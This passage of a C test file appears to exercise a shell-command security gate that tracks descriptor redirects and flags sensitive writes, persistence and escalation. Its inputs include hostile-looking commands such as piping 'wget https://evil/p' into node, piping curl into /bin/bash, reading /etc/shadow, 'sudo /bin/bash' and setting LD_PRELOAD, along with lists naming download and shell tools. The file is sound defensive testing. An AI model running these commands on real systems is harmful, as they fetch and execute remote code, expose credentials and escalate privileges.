       "echo next >&\"$fd\"",
       true},
      {"exec 3>/etc/move-out 4>/tmp/original || exit; "
       "exec 10>&- 11>&- 12>&-; : 4>&- 10>&3-; echo next >&3",
       true},
      {"exec 3>/etc/move-out || exit; exec 10>&- 11>&-; "
       "exec {fd}>&3 {fd}>&3; echo next >&10",
       true},
      {"exec 3>/etc/move-out || exit; exec 10>&- 11>&-; "
       ": {fd}>&3 10>&-; echo next >&\"$fd\"",
       true},
      {"exec 3>/etc/move-out || exit; exec 10>&- 11>&-; "
       "{ :; } {fd}>&3 10>&3-; echo next >&10",
       true},
      {"exec 4>&-; exec 3>/tmp/original; { exec 3>/etc/move-out; } "
       "4>&3-; echo next >&3",
       true},
      {"exec {fd}>/etc/move-out; /bin/true {fd}>/tmp/local; "
       "echo next >&\"$fd\"",
       true},
      {"exec 10>&-; exec {fd}>/etc/move-out; exec 10>&${fd}-; "
       "echo next >&\"$fd\"",
       true},
      {"exec 3>&- 10>&- 11>&-; probe && exec {fd}>/tmp/move-first || "
       "exec {pad}>/tmp/move-pad {fd}>/etc/move-out; exec 10>&${fd}-; "
       "echo next >&10",
       true},
      {"exec 3>/tmp/original 4>/etc/move-out; : 3>&4- 3>&4; echo next >&4",
       true},
      {"exec 3>/tmp/original 4>/etc/move-out; { :; } 3>&4- 3>&4; "
       "echo next >&4",
       true},
      /* Exact save-slot expectations require successful opens, as in the
       * corresponding Shellsplit and fixed-fuzzer undo fixtures. */
      {"exec 3>/tmp/original 4>/etc/move-out || exit; "
       "exec 10>&- 11>&- 12>&- 13>&-; : 3>&4- {fd}>&3; echo next >&12",
       true},
      {"exec 3>/tmp/original 4>/etc/move-out || exit; "
       "exec 10>&- 11>&- 12>&- 13>&-; : 3>&1 3>&4 {fd}>&3; echo next >&12",
       true},
      {"exec 3>/etc/move-out; exec 10>&- 11>&-; "
       "{ echo next >&10; } 3>&1",
       true},
      {"exec 3>/etc/move-out; exec 11>&- 12>&-; "
       "{ :; } 3>&1; echo next >&11",
       false},
      {"exec 4>/etc/move-out; : 4>&\"\"-; echo next >&4", true},
      {"exec 4>/etc/move-out; { :; } 4>&''-; echo next >&4", true},
      {"exec 1>/etc/move-out || exit; exec 10>&-; exec 10>&10-; "
       "exec {fd}>&1; echo next >&10",
       true},
      {"exec 1>/etc/move-out || exit; exec 10>&-; { :; } 10>&10; "
       "exec {fd}>&1; echo next >&10",
       true},
      {"exec 3>/etc/move-out; exec 10>& - 11>& - 12>& -; "
       "{ echo next >&11; } 3>&1",
       false},
      {"exec 3>&- 10>&- 11>&-; "
       "{ probe && exec {fd}>/tmp/move-first || "
       "exec {pad}>/etc/move-out {fd}>/tmp/move-second; } && "
       "{ exec 10>&${fd}-; echo next >&10; }",
       false},
      {"exec 3>&- 10>&- 11>&-; "
       "{ probe && exec {fd}>/tmp/move-first || "
       "exec {pad}>/etc/move-out {fd}>/tmp/move-second; } && "
       "{ exec 4>&${fd}-; echo next >&4; }",
       false},
      {"exec 3>/etc/move-out 4>/tmp/original || exit; "
       "exec 10>&- 11>&- 12>&-; exec {fd}>&3; "
       ": 3>&${fd}- {fd}>&4; echo next >&10",
       true},
      {"exec 3>/etc/move-out || exit; exec 10>&- 11>&- 12>&-; "
       "exec {fd}>&3; : 3>&${fd}- {fd}>&-; echo next >&10",
       true},
      {"exec 3>/etc/move-out || exit; exec 10>&- 11>&- 12>&-; "
       "exec {fd}>&3; : 3>&${fd}- 11>&3-; echo next >&10",
       true},
      {"exec 3>/etc/move-out 4>/tmp/original || exit; "
       "exec 8>&- 10>&- 11>&- 12>&-; exec {fd}>&3; "
       ": 3>&${fd}- {fd}>&4 5>&8; echo next >&10",
       true},
      {"exec 4>&-; exec 3>/etc/move-out || exit; "
       "{ :; } 4>&3-; echo next >&3",
       false},
      {"exec 4>&-; exec 3>/etc/move-out || exit; "
       "{ :; } 4>&3- || echo next >&3",
       false},
      {"exec 3>/tmp/original 20>/etc/move-out || exit; "
       "exec 10>&- 11>&- 21>&- 22>&-; { echo next >&10; } 3>&20-",
       true},
      {"exec 3>/etc/move-out || exit; exec 10>&- 11>&- 12>&-; "
       "exec {fd}>&3; exec {fd}>&- 11>&3-; echo next >&11",
       false},
      {"exec 3>/etc/move-out || exit; exec 10>&- 11>&-; "
       "{ exec 10>/tmp/original; echo next >&10; } 3>&1",
       true},
      {"exec 10>&-; exec {fd}>&1; : 10>&- 3>&${fd}-; echo next", false},
      {"exec 3>/tmp/original 4>/etc/move-out || exit; "
       "exec 10>&3 11>&- 12>&- 13>&-; "
       "exec 3>&10- 11>&4 10>&-; echo next >&11",
       true},
      {"exec 1>/etc/move-out 3>/tmp/original 4>/tmp/original || exit; "
       "exec 10>&- 11>&- 12>&-; "
       "{ exec 11>&-; } 3>&1 4>&1; echo next >&3",
       true},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    sg_error_t error = eval_cmd(gate, cases[i].source, &result);
    if (error != SG_OK || result.truncated ||
        result.verdict != SG_VERDICT_ALLOW)
      fprintf(stderr,
              "descriptor move case %zu: %s (error %d, verdict %d, "
              "truncated %d, reason %s)\n",
              i, cases[i].source, error, result.verdict, result.truncated,
              result.deny_reason ? result.deny_reason : "none");
    if (result.verdict != SG_VERDICT_ALLOW)
      for (uint32_t j = 0; j < result.subcommand_count; j++)
        fprintf(stderr, "  subcommand %u: %s (verdict %d)\n", j,
                result.subcommands[j].netargv, result.subcommands[j].verdict);
    ASSERT_SG_OK(error);
    ASSERT(!result.truncated && result.verdict == SG_VERDICT_ALLOW);
    bool found = false;
    for (uint32_t j = 0; j < result.subcommand_count; j++) {
      const sg_subcommand_result_t *command = result.subcommands + j;
      static const char echo_netargv[] = "4:echo,4:next,";
      if (command->netargv_length != sizeof(echo_netargv) - 1 ||
          memcmp(command->netargv, echo_netargv, sizeof(echo_netargv) - 1))
        continue;
      found = true;
      ASSERT(!!(command->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) ==
             cases[i].writes);
    }
    ASSERT(found);
    shell_netstring_buffer_t raw = {0}, typed = {0};
    size_t stages;
    ASSERT(shell_build_anomaly_netseqs_buffer(
               cases[i].source, strlen(cases[i].source), NULL, &raw, &typed,
               &stages) == SHELL_PROCESS_OK);
    ASSERT(stages == result.subcommand_count);
    shell_netstring_buffer_free(&raw);
    shell_netstring_buffer_free(&typed);
  }
  /* Check the final consumer, not an earlier FD_OPEN setup: stopped cleanup
   * must keep its exact I/O counts and sensitive-path attribution. */
  static const struct {
    const char *source;
    bool read;
  } stopped_cases[] = {
      {"exec 4>/etc/move-out 10>/tmp/original || exit; "
       "exec 11>&- 12>&- 13>&- 14>&-; echo next 10>&4- >&12",
       false},
      {"exec 4>/etc/move-out 10>/tmp/original || exit; "
       "exec 11>&- 12>&- 13>&- 14>&-; "
       "exec 10>&4- 14>&12-; echo next >&14",
       false},
      {"exec 4>/etc/move-out 10>/tmp/original || exit; "
       "exec 11>&- 12>&- 13>&- 14>&-; "
       "{ echo next >&14; } 10>&4- 14>&12-",
       false},
      {"exec 4</etc/move-out 10</tmp/original || exit; "
       "exec 11<&- 12<&- 13<&- 14<&-; "
       "exec 10<&4- 14<&12-; cat <&14",
       true},
      {"exec 3>/tmp/original 4>/etc/move-out || exit; "
       "exec 10>&3 11>&- 12>&- 13>&-; "
       "exec 3>&10- 11>&4 10>&-; echo next >&11",
       false},
      {"exec 1>/etc/move-out 3>/tmp/original 4>/tmp/original || exit; "
       "exec 10>&- 11>&- 12>&-; "
       "{ exec 11>&-; } 3>&1 4>&1; echo next >&3",
       false},
      {"exec 3</tmp/original 4</etc/move-out || exit; "
       "exec 10<&3 11<&- 12<&- 13<&-; "
       "exec 3<&10- 11<&4 10<&-; cat <&11",
       true},
      {"exec 0</etc/move-out 3</tmp/original 4</tmp/original || exit; "
       "exec 10<&- 11<&- 12<&-; "
       "{ exec 11<&-; } 3<&0 4<&0; cat <&3",
       true},
  };
  for (size_t i = 0; i < sizeof(stopped_cases) / sizeof(stopped_cases[0]);
       i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, stopped_cases[i].source, &result));
    ASSERT(!result.truncated && result.verdict == SG_VERDICT_ALLOW);
    const char *consumer = stopped_cases[i].read ? "3:cat," : "4:echo,4:next,";
    bool found = false;
    for (uint32_t j = 0; j < result.subcommand_count; j++) {
      const sg_subcommand_result_t *command = result.subcommands + j;
      if (command->netargv_length != strlen(consumer) ||
          memcmp(command->netargv, consumer, strlen(consumer)))
        continue;
      found = true;
      ASSERT(command->read_count == (stopped_cases[i].read ? 1u : 0u));
      ASSERT(command->write_count == (stopped_cases[i].read ? 0u : 1u));
      ASSERT(!!(command->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) ==
             !stopped_cases[i].read);
    }
    ASSERT(found);
  }
  static const struct {
    const char *source;
    bool writes;
  } ifs_cases[] = {
      {"exec {out}>/etc/move-out; exec {fd}>&1; IFS=0123456789; "
       ": {out}>&${fd}-; echo next >&\"$out\"",
       true},
      {"exec {out}>/etc/move-out; exec {fd}>&1; IFS=0123456789; "
       "{ :; } {out}>&${fd}-; echo next >&\"$out\"",
       true},
      {"exec {out}>/etc/move-out; exec {fd}>&1; IFS=0123456789; "
       "exec {out}>&${fd}-; echo next",
       false},
  };
  for (size_t i = 0; i < sizeof(ifs_cases) / sizeof(ifs_cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, ifs_cases[i].source, &result));
    ASSERT(!result.truncated && result.verdict == SG_VERDICT_UNDETERMINED);
    bool found = false;
    for (uint32_t j = 0; j < result.subcommand_count; j++) {
      const sg_subcommand_result_t *command = result.subcommands + j;
      if (strcmp(command->netargv, "4:echo,4:next,"))
        continue;
      found = true;
      ASSERT(!!(command->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) ==
             ifs_cases[i].writes);
    }
    ASSERT(found);
    shell_netstring_buffer_t raw = {0}, typed = {0};
    size_t stages;
    ASSERT(shell_build_anomaly_netseqs_buffer(
               ifs_cases[i].source, strlen(ifs_cases[i].source), NULL, &raw,
               &typed, &stages) == SHELL_PROCESS_OK);
    ASSERT(stages == result.subcommand_count + 1);
    shell_netstring_buffer_free(&raw);
    shell_netstring_buffer_free(&typed);
  }
  sg_result_t invalid = {0};
  ASSERT(eval_cmd(gate,
                  "exec {fd}>&1; IFS=0123456789; : {out}>&${fd}-; "
                  "echo next",
                  &invalid) == SG_ERR_PARSE);
  ASSERT(invalid.verdict == SG_VERDICT_REJECT);
  sg_result_t imported = {0};
  ASSERT_SG_OK(eval_cmd(gate,
                        "exec 3>&- 10>&- 11>&-; "
                        "{ probe && exec {fd}>/tmp/move-first || "
                        "exec {pad}>/etc/move-out {fd}>/tmp/move-second; } && "
                        "echo \"$(exec 4>&${fd}-; printf next >&4)\"",
                        &imported));
  ASSERT(!imported.truncated && imported.verdict != SG_VERDICT_REJECT);
  bool found_import = false;
  for (uint32_t i = 0; i < imported.subcommand_count; i++) {
    const sg_subcommand_result_t *command = imported.subcommands + i;
    const char expected[] = "6:printf,4:next,";
    if (command->netargv_length != sizeof(expected) - 1 ||
        memcmp(command->netargv, expected, sizeof(expected) - 1))
      continue;
    found_import = true;
    ASSERT(command->write_count == 2 &&
           !(command->violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
  }
  ASSERT(found_import);
  sg_gate_free(gate);
}

TEST(fd_open_violation_contract) {
  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "printf *", false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "exec", false));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "printf x >/etc/replaced >/tmp/out", &result));
  ASSERT(
      result.subcommand_count == 1 && result.subcommands[0].write_count == 2 &&
      (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) &&
      (result.subcommands[0].violation_type_flags & SG_VIOL_WRITE_SENSITIVE));

  ASSERT_SG_OK(
      eval_cmd(gate, "{ printf x; } >/etc/group-replaced >/tmp/out", &result));
  ASSERT(
      result.subcommand_count == 1 && result.subcommands[0].write_count == 2 &&
      (result.subcommands[0].violation_type_flags & SG_VIOL_WRITE_SENSITIVE));

  ASSERT_SG_OK(eval_cmd(gate, "exec {fd}>/etc/named-output", &result));
  ASSERT(result.subcommand_count == 1 &&
         result.subcommands[0].write_count == 1 &&
         (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE));

  ASSERT_SG_OK(eval_cmd(gate, "printf x >>~/.bashrc >/tmp/out", &result));
  ASSERT(result.subcommand_count == 1 &&
         result.subcommands[0].write_count == 2 &&
         (result.violation_type_flags & SG_VIOL_PERSISTENCE));

  ASSERT_SG_OK(
      eval_cmd(gate, "sudo cat /etc/shadow >/tmp/first >/tmp/out", &result));
  ASSERT(result.subcommand_count == 1 &&
         result.subcommands[0].write_count == 2 &&
         (result.violation_type_flags & SG_VIOL_SUDO_REDIRECT));

  ASSERT_SG_OK(eval_cmd(
      gate, "printf x >/tmp/replaced >/tmp/out; cat /tmp/replaced", &result));
  ASSERT((result.violation_type_flags & SG_VIOL_WRITE_THEN_READ) != 0);

  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.redirect_fanout_threshold = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  ASSERT_SG_OK(eval_cmd(gate, "printf x >/tmp/one >/tmp/two", &result));
  ASSERT(result.subcommand_count == 1 &&
         result.subcommands[0].write_count == 2 &&
         (result.violation_type_flags & SG_VIOL_REDIRECT_FANOUT));

  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  ASSERT_SG_OK(eval_cmd(gate, "exec {fd}</etc/input-only", &result));
  ASSERT(result.subcommand_count == 1 &&
         result.subcommands[0].write_count == 0 &&
         !(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE));

  ASSERT_SG_OK(eval_cmd(gate, "exec 3>/tmp/one; exec 4>&3", &result));
  ASSERT(result.subcommand_count == 2 &&
         result.subcommands[0].write_count == 1 &&
         result.subcommands[1].write_count == 0);

  /* A known-bad duplication prevents later opens and the command body. An
   * earlier open remains a real setup side effect even though that body never
   * executes. */
  ASSERT_SG_OK(
      eval_cmd(gate, "exec 3>&-; printf x 4>&3 >/etc/skipped", &result));
  ASSERT(result.subcommand_count == 2 &&
         result.subcommands[1].write_count == 0 &&
         !(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE));

  ASSERT_SG_OK(eval_cmd(
      gate, "exec 3>&-; printf x >/etc/reached 4>&3 >/etc/skipped", &result));
  ASSERT(
      result.subcommand_count == 2 && result.subcommands[1].write_count == 1 &&
      (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) &&
      (result.subcommands[1].violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
  sg_gate_free(gate);
}

/* Current-shell builtins still execute redirects and nested shell syntax.
 * Their graph endpoints must reach the same violation and inspection passes
 * as ordinary commands. */
TEST(current_shell_builtin_graph_effects) {
  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};

  ASSERT_SG_OK(eval_cmd(gate, "cd /tmp >/etc/cd-output", &result));
  ASSERT(
      result.has_violations && result.subcommand_count == 1 &&
      (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) &&
      (result.subcommands[0].violation_type_flags & SG_VIOL_WRITE_SENSITIVE));

  ASSERT_SG_OK(eval_cmd(gate, "export VALUE=one >/etc/export-output", &result));
  ASSERT(
      result.has_violations && result.subcommand_count == 1 &&
      (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) &&
      (result.subcommands[0].violation_type_flags & SG_VIOL_WRITE_SENSITIVE));

  ASSERT_SG_OK(eval_cmd(gate, "cd \"$(printf /tmp)\"", &result));
  ASSERT(result.requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cd /tmp >\"$(cat /etc/shadow)\"", &result));
  ASSERT(result.has_dynamic_substitution_io &&
         (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE));
  sg_gate_free(gate);
}

/* A dynamic FILE name is topology rather than data-as-code, but it still has
 * an owning command or group even after a later redirect replaces its route. */
TEST(fd_open_dynamic_filename_consumer_contract) {
  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "printf *", false));

  static const char *const inputs[] = {
      "printf x >\"$(cat /etc/shadow)\" >/tmp/out",
      "{ printf x; } >\"$(cat /etc/shadow)\" >/tmp/out",
      "exec {fd}>\"$(cat /etc/shadow)\"",
      "exec {fd}<\"$(cat /etc/shadow)\"",
      "exec {fd}<>\"$(cat /etc/shadow)\"",
  };
  for (size_t i = 0; i < sizeof(inputs) / sizeof(inputs[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, inputs[i], &result));
    ASSERT(result.has_dynamic_substitution_io &&
           !result.requires_substitution_evaluation &&
           (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE));
    uint32_t dynamic_consumers = 0;
    uint32_t sensitive_consumers = 0;
    bool named_input_owner = false;
    for (uint32_t command = 0; command < result.subcommand_count; command++) {
      dynamic_consumers +=
          result.subcommands[command].has_dynamic_substitution_io;
      sensitive_consumers += (result.subcommands[command].violation_type_flags &
                              SG_VIOL_SUBST_SENSITIVE) != 0;
      if (i >= 3 && result.subcommands[command].display_command != NULL &&
          strcmp(result.subcommands[command].display_command, "exec") == 0)
        named_input_owner =
            result.subcommands[command].has_dynamic_substitution_io &&
            (result.subcommands[command].violation_type_flags &
             SG_VIOL_SUBST_SENSITIVE) != 0;
    }
    ASSERT(dynamic_consumers >= 1 && sensitive_consumers >= 1 &&
           (i < 3 || named_input_owner));
  }
  sg_gate_free(gate);
}

TEST(group_owned_violation_context) {
  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  ASSERT_SG_OK(
      eval_cmd(gate, "{ echo one; printf two; } > /etc/group-output", &result));
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);
  for (uint32_t i = 0; i < result.subcommand_count; i++) {
    ASSERT(result.subcommands[i].write_count == 1);
    ASSERT(result.subcommands[i].read_count == 0);
    ASSERT(result.subcommands[i].violation_type_flags &
           SG_VIOL_WRITE_SENSITIVE);
  }
  sg_gate_free(gate);
}

TEST(group_owned_multiple_redirect_violation_context) {
  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(
      gate, "{ echo one; printf two; } 3>/tmp/trace >/etc/group-output",
      &result));
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);
  for (uint32_t i = 0; i < result.subcommand_count; i++) {
    ASSERT(result.subcommands[i].write_count == 2);
    ASSERT(result.subcommands[i].read_count == 0);
    ASSERT(result.subcommands[i].violation_type_flags &
           SG_VIOL_WRITE_SENSITIVE);
  }
  sg_gate_free(gate);
}

TEST(nested_group_owned_violation_scope) {
  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate,
                        ("{ echo outer-before; { echo inner; } "
                         "4>/tmp/inner-trace >/etc/inner; echo outer-after; } "
                         "3>/tmp/outer-trace >/etc/outer"),
                        &result));
  ASSERT(result.subcommand_count == 3);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);
  /* Outer redirects apply to every member. Inner redirects apply only to the
   * nested member, so sibling commands must not inherit its I/O context. */
  ASSERT(result.subcommands[0].write_count == 2);
  ASSERT(result.subcommands[1].write_count == 4);
  ASSERT(result.subcommands[2].write_count == 2);
  for (uint32_t i = 0; i < result.subcommand_count; i++) {
    ASSERT(result.subcommands[i].read_count == 0);
    ASSERT(result.subcommands[i].violation_type_flags &
           SG_VIOL_WRITE_SENSITIVE);
  }
  sg_gate_free(gate);
}

TEST(violation_configuration_matrix) {
  enum configuration_kind {
    CONFIG_FANOUT,
    CONFIG_CUSTOM_PATH,
    CONFIG_UNSORTED_NAMES
  };
  static const struct {
    enum configuration_kind kind;
    const char *command;
    uint32_t expected_flag;
    const char *detail_contains;
  } cases[] = {{CONFIG_FANOUT, "echo x > /etc/fanout-test",
                SG_VIOL_REDIRECT_FANOUT, NULL},
               {CONFIG_CUSTOM_PATH, "echo x > /my/custom/data",
                SG_VIOL_WRITE_SENSITIVE, "/my/custom/data"},
               {CONFIG_UNSORTED_NAMES, "wget https://evil/p | node",
                SG_VIOL_NET_DOWNLOAD_EXEC, "node"}};

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = sg_gate_new();
    ASSERT(gate != NULL);
    sg_violation_config_t config;
    sg_violation_config_default(&config);
    if (cases[i].kind == CONFIG_FANOUT) {
      config.redirect_fanout_threshold = 0;
    } else if (cases[i].kind == CONFIG_CUSTOM_PATH) {
      config.sensitive_write_paths[0] = "/my/custom/";
      config.sensitive_write_path_count = 1;
    } else {
      config.download_cmds[0] = "wget";
      config.download_cmds[1] = "curl";
      config.download_cmd_count = 2;
      config.shell_spawn_cmds[0] = "node";
      config.shell_spawn_cmds[1] = "bash";
      config.shell_spawn_cmd_count = 2;
    }
    ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
    ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo *", false));

    sg_result_t result;
    ASSERT(eval_cmd(gate, cases[i].command, &result) == SG_OK);
    ASSERT(violation_result_is_consistent(&result));
    ASSERT(result.violation_type_flags & cases[i].expected_flag);
    const sg_violation_t *record = NULL;
    for (uint32_t j = 0; j < result.violation_count; j++)
      if (result.violations[j].type == cases[i].expected_flag) {
        record = &result.violations[j];
        break;
      }
    ASSERT(record != NULL);
    ASSERT(record->category_flags != 0);
    ASSERT(result.violation_type_flags & cases[i].expected_flag);
    if (!cases[i].detail_contains)
      ASSERT(record->detail == NULL);
    else
      ASSERT(record->detail &&
             strstr(record->detail, cases[i].detail_contains));
    sg_gate_free(gate);
  }
}

TEST(configured_shell_executable_matching) {
  static const struct {
    const char *command;
    uint32_t flag;
    bool expected;
  } exact_path_cases[] = {
      {"curl https://example.test/p | /bin/bash", SG_VIOL_NET_DOWNLOAD_EXEC,
       true},
      {"curl https://example.test/p | /opt/bash", SG_VIOL_NET_DOWNLOAD_EXEC,
       false},
      {"sudo /bin/bash", SG_VIOL_SHELL_ESCALATION, true},
      {"sudo -- '/bin/bash'", SG_VIOL_SHELL_ESCALATION, true},
      {"sudo /opt/bash", SG_VIOL_SHELL_ESCALATION, false},
      {"su -s /bin/bash root", SG_VIOL_SHELL_ESCALATION, true},
      {"su --shell /bin/bash root", SG_VIOL_SHELL_ESCALATION, true},
      {"su -s/bin/bash root", SG_VIOL_SHELL_ESCALATION, true},
      {"su --shell=/bin/bash root", SG_VIOL_SHELL_ESCALATION, true},
      {"su -s /opt/bash root", SG_VIOL_SHELL_ESCALATION, false},
      {"su -s/opt/bash root", SG_VIOL_SHELL_ESCALATION, false},
      {"su --shell=/opt/bash root", SG_VIOL_SHELL_ESCALATION, false},
      {"sudo \"$shell\"", SG_VIOL_SHELL_ESCALATION, false},
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.shell_spawn_cmds[0] = "/bin/bash";
  config.shell_spawn_cmd_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  sg_result_t result = {0};
  for (size_t i = 0; i < sizeof(exact_path_cases) / sizeof(exact_path_cases[0]);
       i++) {
    ASSERT_SG_OK(eval_cmd(gate, exact_path_cases[i].command, &result));
    ASSERT(violation_result_is_consistent(&result));
    ASSERT(!!(result.violation_type_flags & exact_path_cases[i].flag) ==
           exact_path_cases[i].expected);
  }

  config.shell_spawn_cmds[0] = "bash";
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  ASSERT_SG_OK(eval_cmd(gate, "sudo /opt/bash", &result));
  ASSERT(result.violation_type_flags & SG_VIOL_SHELL_ESCALATION);
  ASSERT_SG_OK(eval_cmd(gate, "su -s/opt/bash root", &result));
  ASSERT(result.violation_type_flags & SG_VIOL_SHELL_ESCALATION);
  ASSERT_SG_OK(
      eval_cmd(gate, "curl https://example.test/p | /opt/bash", &result));
  ASSERT(result.violation_type_flags & SG_VIOL_NET_DOWNLOAD_EXEC);
  sg_gate_free(gate);
}

TEST(quoted_environment_name_violation) {
  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_env_names[0] = "LD_PRELOAD";
  config.sensitive_env_name_count = 1;
  config.sensitive_cmd_names[0] = "export";
  config.sensitive_cmd_name_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "export \"LD_PRELOAD=mal.so\"", &result));
  ASSERT(result.violation_type_flags & SG_VIOL_ENV_PRIVILEGED);
  bool found = false;
  for (uint32_t i = 0; i < result.violation_count; i++) {
    if (result.violations[i].type == SG_VIOL_ENV_PRIVILEGED) {
      ASSERT(result.violations[i].detail &&
             strstr(result.violations[i].detail, "LD_PRELOAD before export"));
      found = true;
    }
  }
  ASSERT(found);
  ASSERT_SG_OK(eval_cmd(gate, "export \"OTHER=mal.so\"", &result));
  ASSERT(!(result.violation_type_flags & SG_VIOL_ENV_PRIVILEGED));
  sg_gate_free(gate);
}

TEST(violation_configuration_replacement_is_atomic) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/opt/custom/";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo *", false));

  sg_result_t result;
  ASSERT(eval_cmd(gate, "echo x > /opt/custom/file", &result) == SG_OK);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);

  sg_violation_config_t invalid = config;
  invalid.sensitive_write_path_count = SG_VIOL_MAX_PATHS + 1;
  ASSERT(sg_gate_set_violation_config_borrowed(gate, &invalid) ==
         SG_ERR_INVALID);
  ASSERT(eval_cmd(gate, "echo x > /opt/custom/file", &result) == SG_OK);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);

  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  ASSERT(eval_cmd(gate, "echo x > /opt/custom/file", &result) == SG_OK);
  ASSERT(!(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
  sg_gate_free(gate);
}

/* Descriptor setup is itself observable, so inspect the actual writer's flags
 * rather than the aggregate flag that an exec redirect may already set. */
TEST(scope_outcome_writer_violations) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  /* Conditional lists may conservatively lose CWD knowledge. A relative
   * configured prefix deliberately matches the document's source spelling. */
  config.sensitive_write_paths[0] = "out";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t i = 0; i < sizeof(shellsplit_test_descriptor_outcomes) /
                             sizeof(shellsplit_test_descriptor_outcomes[0]);
       i++) {
    sg_result_t result;
    ASSERT_SG_OK(
        eval_cmd(gate, shellsplit_test_descriptor_outcomes[i].source, &result));
    bool found = false;
    for (uint32_t c = 0; c < result.subcommand_count; c++) {
      const sg_subcommand_result_t *command = &result.subcommands[c];
      if (strcmp(command->netargv, "6:printf,7:payload,") != 0)
        continue;
      found = true;
      ASSERT(((command->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0) ==
             shellsplit_test_descriptor_outcomes[i].out);
    }
    ASSERT(found && !result.truncated);
  }
  config.sensitive_write_paths[0] = "base";
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t i = 0; i < sizeof(shellsplit_test_descriptor_outcomes) /
                             sizeof(shellsplit_test_descriptor_outcomes[0]);
       i++) {
    sg_result_t result;
    ASSERT_SG_OK(
        eval_cmd(gate, shellsplit_test_descriptor_outcomes[i].source, &result));
    bool found = false;
    for (uint32_t c = 0; c < result.subcommand_count; c++) {
      const sg_subcommand_result_t *command = &result.subcommands[c];
      if (strcmp(command->netargv, "6:printf,7:payload,") != 0)
        continue;
      found = true;
      ASSERT(((command->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0) ==
             shellsplit_test_descriptor_outcomes[i].base);
    }
